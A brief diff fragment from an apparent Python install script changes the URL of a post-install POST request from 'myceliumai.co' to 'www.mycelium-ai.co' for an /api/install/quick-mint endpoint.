@@ -422,7 +422,7 @@ payload = json.dumps({
     "stage": "post_install",
 }).encode()
 req = urllib.request.Request(
-    "https://myceliumai.co/api/install/quick-mint",
+    "https://www.mycelium-ai.co/api/install/quick-mint",
     data=payload, headers={"content-type": "application/json"}, method="POST")
 try:
     with urllib.request.urlopen(req, timeout=12) as r:
